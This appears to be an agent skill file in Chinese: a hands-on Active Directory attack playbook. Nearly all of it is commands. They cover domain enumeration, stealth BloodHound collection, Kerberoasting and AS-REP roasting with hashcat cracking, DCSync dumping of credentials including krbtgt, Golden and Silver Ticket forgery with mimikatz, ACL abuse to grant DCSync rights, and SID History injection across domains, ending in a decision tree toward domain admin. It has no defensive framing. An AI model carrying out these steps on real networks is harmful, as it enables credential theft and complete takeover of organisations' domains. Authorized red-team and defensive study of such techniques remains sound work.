---
name: domain-penetration
description: 域渗透与Active Directory攻击，覆盖域信息收集→BloodHound→Kerberoasting→AS-REP→DCSync→Golden/Silver Ticket→跨域信任→ACL攻击全流程
---

# 域渗透实战

## 1. 域信息收集

```powershell
# 基础枚举
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain
nltest /dclist:domain.local
echo %LOGONSERVER%

# 信任关系
nltest /domain_trusts
nltest /trusted_domains
```

### PowerView

```powershell
. .\PowerView.ps1
Get-Domain                                    # 当前域
Get-DomainController                          # 域控
Get-DomainUser -Properties samaccountname,serviceprincipalname,pwdlastset,lastlogon
Get-DomainGroup "Domain Admins" -Recurse      # 域管组成员
Get-DomainComputer -Properties dnshostname,operatingsystem
Get-DomainGPO                                 # GPO
Get-DomainTrust                               # 信任关系
Get-NetForestDomain                           # 林内所有域
Find-DomainUserLocation                       # 域管当前登录在哪
Get-DomainFileServer                          # 文件服务器
```

### ADRecon

```powershell
# 自动化域信息收集 + Excel报告
. .\ADRecon.ps1
```

## 2. BloodHound

```bash
# Step 1: 收集数据
# Windows:
SharpHound.exe -c All --zipfilename bloodhound.zip
SharpHound.exe -c Session,Group,LocalAdmin --stealth

# Step 2: 导入 BloodHound → Neo4j

# 关键查询:
# - Find Shortest Paths to Domain Admins
# - Find Principals with DCSync Rights
# - Find Kerberoastable Users
# - Find AS-REP Roastable Users
# - Find Computers with Unconstrained Delegation
# - Find All Paths to Domain Admins from Owned Principals
```

## 3. Kerberoasting

```powershell
# Rubeus
Rubeus.exe kerberoast /format:hashcat
Rubeus.exe kerberoast /creduser:DOMAIN\User /credpassword:pass

# PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

# Impacket
GetUserSPNs.py DOMAIN/User:pass -request

# 破解
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

## 4. AS-REP Roasting

```powershell
# Rubeus
Rubeus.exe asreproast /format:hashcat

# PowerView
Get-DomainUser -PreauthNotRequired

# Impacket
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat

# 破解: hashcat -m 18200 asrep.hash wordlist.txt
```

## 5. DCSync

```bash
# 复制域控凭证 (需要 Replication-Get-Changes-All 权限)
# mimikatz
privilege::debug
lsadump::dcsync /domain:DOMAIN /all
lsadump::dcsync /domain:DOMAIN /user:Administrator

# Impacket
secretsdump.py DOMAIN/Administrator:pass@dc-ip
secretsdump.py -just-dc-user krbtgt DOMAIN/User@dc-ip
```

## 6. Golden Ticket

```bash
# 获取krbtgt NTLM Hash (通过DCSync)
# 获取Domain SID (whoami /user 去掉最后的-RID)
whoami /user  # S-1-5-21-XXXX-YYYY-ZZZZ-500 → SID: S-1-5-21-XXXX-YYYY-ZZZZ

# mimikatz
kerberos::golden /domain:DOMAIN /sid:S-1-5-21-XXX /krbtgt:<hash> /user:FakeAdmin /id:500 /ticket:golden.kirbi
kerberos::ptt golden.kirbi

# 验证
dir \\dc\c$
```

## 7. Silver Ticket

```bash
# 伪造特定服务票据 (静默, 不接触DC)
# mimikatz (需要目标服务账号的NTLM hash)
kerberos::golden /domain:DOMAIN /sid:S-1-5-21-XXX /target:dc.domain.local /service:CIFS /rc4:<service_hash> /user:FakeUser /ticket:silver.kirbi
```

## 8. ACL攻击

```powershell
# 查找有DCSync权限的用户
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReference -match "DOMAIN\\User"}

# 授予DCSync权限 (需要WriteDacl等)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity User -Rights DCSync
```

## 9. 跨域攻击

```bash
# 林内跨域: 利用SID History注入 (需要域管权限)
mimikatz # kerberos::golden /domain:child.domain.local /sid:S-1-5-21-ChildSID /krbtgt:<hash> /sids:S-1-5-21-ParentSID-519 /user:Admin /ticket:cross.kirbi

# 域信任利用:
# - 信任密钥窃取 (mimikatz lsadump::trust)
# - SID过滤绕过
```

## 10. 攻击流程决策树

```
域用户凭证 → 域信息收集
├─ 查找SPN账号 → Kerberoasting → 破解 → 高权限账号
├─ 查找不需要预认证的账号 → AS-REP Roasting → 破解
├─ BloodHound → 最短路径到域管
│   ├─ 通过ACL → WriteDacl/Owner/GenericWrite滥用
│   ├─ 通过委派 → Unconstrained/Constrained Delegation
│   └─ 通过组 → 嵌套组成员关系
├─ 已控域管权限 → DCSync → krbtgt hash → Golden Ticket
└─ 已控域管权限 → SID History注入 → 跨域攻击
```

---

*参考: BloodHound + mimikatz + Impacket + HackTricks Active Directory*
